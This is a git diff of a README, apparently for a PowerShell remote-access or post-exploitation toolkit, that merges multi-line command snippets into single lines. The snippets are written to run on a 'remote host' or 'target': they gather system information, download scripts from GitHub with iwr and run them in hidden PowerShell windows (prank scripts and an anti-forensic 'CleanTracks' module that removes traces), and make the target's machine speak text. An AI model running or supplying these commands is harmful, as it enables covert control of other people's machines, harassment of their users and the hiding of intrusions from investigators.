@@ -121,11 +121,7 @@ iwr -uri "https://gist.githubusercontent.com/r00t-3xp10it/c328acda60dcfa5460888e
 
 #### Retrieve remote system information
 ```powershell
-systeminfo|Out-File systeminfo.log -force
-echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo ""
-
-# CleanUP artifacts
-Remove-Item systeminfo.log -force
+systeminfo|Out-File systeminfo.log -force;echo "";Get-Content systeminfo.log|findstr "Host OS Registered Owner: Locale:"|findstr /V /C:"Registered Organization:"|findstr /V /C:"BIOS Version:"|findstr /V /C:"OS Build Type:"|findstr /V /C:"Input Locale:";echo "";Start-Sleep -Seconds 1;Remove-Item systeminfo.log -force
 ```
 
 #### Stop\Start remote processes
@@ -146,20 +142,17 @@ powershell (New-Object -ComObject Wscript.Shell).PopUp("BLOCKED ACCESS TO $Env:C
 
 #### Windows Update Prank ( prank your co-workers -- press F11 on target keyboard to exit prank )
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1"
-Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/FWUprank.ps1" -outfile "FWUprank.ps1";Start-Process -WindowStyle Hidden powershell -ArgumentList "-file FWUprank.ps1 -autodelete on"
 ```
 
 #### Do A Barrel Roll Loop Prank ( loop prank 5 times with 17 seconds delay before next loop )
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1"
-Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 17 -AutoDel on -MsgBoxClose 20"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/Prank2.ps1" -OutFile "Prank2.ps1";Start-Process -WindowStyle Hidden powershell -ArgumentList "-File Prank2.ps1 -StartDelay 1 -LoopRange 5 -LoopDelay 17 -AutoDel on -MsgBoxClose 20"
 ```
 
 #### Speak a frase to remote host
 ```powershell
-$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       k U khhhr UU  rRr     U  ii          THE END"
-Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 99;$SpeakObect.Rate = -3;$SpeakObect.Speak($SPEAKME)
+$SPEAKME = "UAUAUUAUAUUA   UUUUAUUAUUAUA  A A aAAAAaAAAaAaA   MERDA   AAAHAABAI UIAIUAUVA U   U     U     MERDA     U             U       k U khhhr UU  rRr     U  ii          THE END";Add-Type -AssemblyName System.speech;$SpeakObect = New-Object System.Speech.Synthesis.SpeechSynthesizer;$SpeakObect.Volume = 99;$SpeakObect.Rate = -3;$SpeakObect.Speak($SPEAKME)
 ```
 
 <br />
@@ -188,8 +181,7 @@ Remove-Item Browser.report -force
 
 #### Clean remote target artifacts {anti-forensic module}
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1" -OutFile "CleanTracks.ps1"
-powershell -file CleanTracks.ps1 -CleanTracks Clear -verb true
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1" -OutFile "CleanTracks.ps1";powershell -file CleanTracks.ps1 -CleanTracks Clear -verb true
 ```
 **remark:** <b><i>cleantracks.ps1</b></i> will run attached to <b><i>papacat</b></i> process {client} so.. its advice to wait 30 seconds for module to finish working.
 ![w3](https://github.com/r00t-3xp10it/redpill/assets/23490060/061dd192-2b18-4fc4-9077-a58cf086dde3)
